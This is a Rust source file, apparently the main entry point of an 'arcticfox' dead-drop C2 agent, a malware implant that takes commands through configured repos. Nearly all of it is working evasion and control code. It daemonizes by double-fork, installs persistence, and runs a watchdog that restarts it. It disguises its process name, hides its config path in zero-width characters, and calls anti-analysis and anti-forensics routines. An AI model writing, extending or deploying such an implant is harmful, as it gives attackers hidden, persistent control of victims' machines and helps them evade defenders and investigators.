//! C3 Agent — main entry point.
//!
//! Command-line interface for the dead-drop C2 agent.
//! In daemon mode, performs double-fork + setsid + fd redirect.

use clap::Parser;
use std::path::PathBuf;
use tokio::sync::watch;
use tracing::{debug, error, info};
use tracing_subscriber::EnvFilter;

use arcticfox_agent::{Agent, install_persistence};

#[derive(Parser)]
#[command(name = "agent", version, about)]
struct Cli {
    /// Path to config file (ZW-encoded in /proc via stealth-name on watchdog mode)
    #[arg(short = 'c', long = "config", default_value = "pb_config.json")]
    config: PathBuf,

    /// Run in daemon mode (background with double-fork)
    #[arg(long)]
    daemon: bool,

    /// Install persistence and exit
    #[arg(long)]
    install: bool,

    /// Path to agent binary (for persistence install)
    #[arg(long)]
    agent_path: Option<PathBuf>,

    /// Enable verbose logging
    #[arg(short = 'v', long = "verbose")]
    verbose: bool,

    /// Bot ID override
    #[arg(long)]
    bot_id: Option<String>,

    /// Stealth: camouflage process name (may contain ZW-encoded config path)
    #[arg(long = "name")]
    stealth_name: Option<String>,

    /// Watchdog mode — monitors a parent PID
    #[arg(long)]
    watchdog: bool,

    /// Parent PID for watchdog
    #[arg(long = "ppid")]
    parent_pid: Option<u32>,
}

#[cfg(target_os = "linux")]
fn daemonize() {
    // Double-fork to detach from terminal
    unsafe {
        if libc::fork() != 0 {
            std::process::exit(0);
        }
        libc::setsid();
        if libc::fork() != 0 {
            std::process::exit(0);
        }
        // Redirect stdin/stdout/stderr to /dev/null
        let devnull = libc::open(b"/dev/null\0".as_ptr() as *const libc::c_char, libc::O_RDWR);
        if devnull >= 0 {
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            if devnull > 2 { libc::close(devnull); }
        }
    }
}

#[cfg(not(target_os = "linux"))]
fn daemonize() {}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    if cli.daemon {
        daemonize();
    }

    let env_filter = if cli.verbose {
        EnvFilter::new("debug")
    } else if cli.daemon {
        EnvFilter::new("warn")
    } else {
        EnvFilter::new("arcticfox_agent=info,arcticfox_core=warn")
    };

    tracing_subscriber::fmt()
        .with_env_filter(env_filter)
        .with_target(false)
        .with_writer(std::io::stderr)
        .init();

    // ── Stealth: camouflage + extract ZW data from name ───────────────────
    let raw_name = cli.stealth_name
        .unwrap_or_else(|| arcticfox_agent::stealth::random_service_name().to_string());

    // Extract visible name + ZW-encoded config path from stealth_name
    let config_zw_path = arcticfox_agent::stealth::extract_zw_data(&raw_name);
    let (stealth_name, config_override) = if let Some(zw) = config_zw_path {
        (arcticfox_core::zwcodec::strip(&raw_name), Some(String::from_utf8_lossy(&zw).to_string()))
    } else {
        (raw_name, None)
    };

    // Override config path if ZW-encoded one was found in stealth_name
    let config_path: PathBuf = config_override.map(PathBuf::from).unwrap_or(cli.config);

    arcticfox_agent::stealth::camouflage_process_name(&stealth_name);
    arcticfox_agent::stealth::set_process_title(&stealth_name);

    // ── Anti-analysis / anti-forensics ────────────────────────────────────
    arcticfox_agent::anti_analysis::detect_hostile_environment();
    arcticfox_agent::anti_forensics::deploy_anti_forensics(
        &stealth_name,
        &std::env::current_exe()
            .unwrap_or_else(|_| std::path::PathBuf::from("."))
            .display()
            .to_string(),
    );

    // ── Watchdog mode ─────────────────────────────────────────────────────
    if cli.watchdog {
        if let Some(ppid) = cli.parent_pid {
            let agent_path = cli.agent_path.unwrap_or_else(|| {
                std::env::current_exe().unwrap_or_else(|_| PathBuf::from("."))
            });
            arcticfox_agent::stealth::watchdog_loop(ppid, agent_path, config_path).await;
            return;
        }
        error!("Watchdog mode requires --ppid");
        std::process::exit(1);
    }

    // Install persistence and exit
    if cli.install {
        let agent_path = cli.agent_path.unwrap_or_else(|| {
            std::env::current_exe().unwrap_or_else(|_| PathBuf::from("."))
        });
        if let Err(e) = install_persistence(&agent_path, &config_path) {
            error!("Failed to install persistence: {e}");
            std::process::exit(1);
        }
        info!("Persistence installed successfully");
        return;
    }

    // Load config
    let config = match arcticfox_core::config::AgentConfig::load(&config_path) {
        Ok(cfg) => cfg,
        Err(e) => {
            error!("Failed to load config: {e}");
            std::process::exit(1);
        }
    };

    // Validate config
    if config.repos.is_empty() {
        error!("No repos configured in config file");
        std::process::exit(1);
    }

    debug!("Loaded {} repos", config.repos.len());

    // Set up shutdown signal
    let (shutdown_tx, shutdown_rx) = watch::channel(false);
    let shutdown_tx_clone = shutdown_tx.clone();
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        shutdown_tx_clone.send(true).ok();
    });

    // Create and run agent
    let agent = match Agent::new(config, cli.bot_id, config_path).await {
        Ok(a) => a,
        Err(e) => {
            error!("Failed to initialize agent: {e}");
            std::process::exit(1);
        }
    };

    if let Err(e) = agent.run(shutdown_rx).await {
        error!("Agent error: {e}");
        std::process::exit(1);
    }

    debug!("Agent exited cleanly");
}
